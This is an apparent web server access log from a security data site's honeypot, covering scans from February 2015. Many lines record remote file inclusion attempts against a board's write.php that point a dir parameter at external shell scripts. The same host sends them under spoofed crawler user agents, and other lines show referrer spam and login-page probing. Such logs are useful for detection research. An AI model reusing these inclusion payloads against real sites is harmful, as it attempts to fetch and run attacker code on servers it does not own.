176.31.252.38 - - [22/Feb/2015:21:59:20 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [22/Feb/2015:21:59:20 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [22/Feb/2015:21:59:21 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [22/Feb/2015:21:59:21 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [22/Feb/2015:21:59:22 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [22/Feb/2015:21:59:22 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [22/Feb/2015:21:59:24 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
112.208.109.136 - - [22/Feb/2015:22:03:32 -0800] "GET / HTTP/1.1" 301 483 "http://semalt.semalt.com/crawler.php?u=http://secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
112.208.109.136 - - [22/Feb/2015:22:03:33 -0800] "GET / HTTP/1.1" 200 6788 "http://semalt.semalt.com/crawler.php?u=http://secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
112.208.109.136 - - [22/Feb/2015:22:03:33 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
81.218.165.209 - - [22/Feb/2015:22:05:21 -0800] "GET /drupal HTTP/1.1" 301 456 "http://secrepo.com/drupal" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
95.132.156.223 - - [22/Feb/2015:22:05:22 -0800] "GET /wordpress HTTP/1.1" 301 460 "http://secrepo.com/wordpress" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
81.218.165.209 - - [22/Feb/2015:22:05:22 -0800] "GET /drupal HTTP/1.1" 418 547 "http://secrepo.com/drupal" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
118.173.140.0 - - [22/Feb/2015:22:05:23 -0800] "GET /joomla HTTP/1.1" 301 455 "http://secrepo.com/joomla" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
95.132.156.223 - - [22/Feb/2015:22:05:23 -0800] "GET /wordpress HTTP/1.1" 418 547 "http://secrepo.com/wordpress" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
1.52.231.216 - - [22/Feb/2015:22:05:24 -0800] "GET / HTTP/1.1" 301 446 "http://secrepo.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
181.36.71.235 - - [22/Feb/2015:22:05:24 -0800] "GET /wp HTTP/1.1" 301 448 "http://secrepo.com/wp" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
118.173.140.0 - - [22/Feb/2015:22:05:27 -0800] "GET /joomla HTTP/1.1" 418 547 "http://secrepo.com/joomla" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
181.36.71.235 - - [22/Feb/2015:22:05:28 -0800] "GET /wp HTTP/1.1" 418 547 "http://secrepo.com/wp" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
123.96.200.70 - - [22/Feb/2015:22:05:28 -0800] "GET /blog HTTP/1.1" 301 478 "http://secrepo.com/blog" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
1.52.231.216 - - [22/Feb/2015:22:05:28 -0800] "GET / HTTP/1.1" 418 547 "http://secrepo.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
123.96.200.70 - - [22/Feb/2015:22:05:40 -0800] "GET /blog HTTP/1.1" 418 547 "http://secrepo.com/blog" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
176.31.252.38 - - [22/Feb/2015:22:17:28 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [22/Feb/2015:22:17:29 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [22/Feb/2015:22:17:29 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [22/Feb/2015:22:17:30 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [22/Feb/2015:22:17:30 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [22/Feb/2015:22:17:31 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [22/Feb/2015:22:17:32 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [22/Feb/2015:22:17:33 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [22/Feb/2015:23:18:09 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [22/Feb/2015:23:18:11 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [22/Feb/2015:23:18:11 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [22/Feb/2015:23:18:12 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [22/Feb/2015:23:18:12 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [22/Feb/2015:23:18:13 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [22/Feb/2015:23:18:13 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [22/Feb/2015:23:18:15 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [22/Feb/2015:23:18:36 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [22/Feb/2015:23:18:37 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [22/Feb/2015:23:18:37 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [22/Feb/2015:23:18:38 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [22/Feb/2015:23:18:39 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [22/Feb/2015:23:18:40 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [22/Feb/2015:23:18:40 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [22/Feb/2015:23:18:41 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [22/Feb/2015:23:18:59 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [22/Feb/2015:23:19:00 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [22/Feb/2015:23:19:00 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [22/Feb/2015:23:19:02 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [22/Feb/2015:23:19:02 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [22/Feb/2015:23:19:03 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [22/Feb/2015:23:19:03 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [22/Feb/2015:23:19:04 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
46.119.124.167 - - [23/Feb/2015:00:09:42 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://kinotrip.ru/" "Mozilla/4.0 (compatible; MSIE 5.01; Windows 95; MSIECrawler)" 
46.119.124.167 - - [23/Feb/2015:00:09:42 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://kinotrip.ru/" "Mozilla/4.0 (compatible; MSIE 5.01; Windows 95; MSIECrawler)" 
46.119.124.167 - - [23/Feb/2015:00:09:43 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://kinotrip.ru/" "Mozilla/4.0 (compatible; MSIE 5.01; Windows 95; MSIECrawler)" 
199.16.156.124 - - [23/Feb/2015:00:28:11 -0800] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.124 - - [23/Feb/2015:00:28:11 -0800] "GET /self.logs/ HTTP/1.1" 200 1246 "-" "Twitterbot/1.0" 
62.219.99.154 - - [23/Feb/2015:00:57:19 -0800] "GET / HTTP/1.0" 301 461 "-" "-" 
62.219.99.154 - - [23/Feb/2015:00:57:19 -0800] "GET /wp-login.php HTTP/1.0" 301 485 "-" "-" 
62.219.99.154 - - [23/Feb/2015:00:57:19 -0800] "GET /administrator/index.php HTTP/1.0" 301 507 "-" "-" 
176.31.252.38 - - [23/Feb/2015:01:10:24 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [23/Feb/2015:01:10:25 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [23/Feb/2015:01:10:25 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [23/Feb/2015:01:10:26 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [23/Feb/2015:01:10:26 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [23/Feb/2015:01:10:28 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [23/Feb/2015:01:10:28 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [23/Feb/2015:01:10:29 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
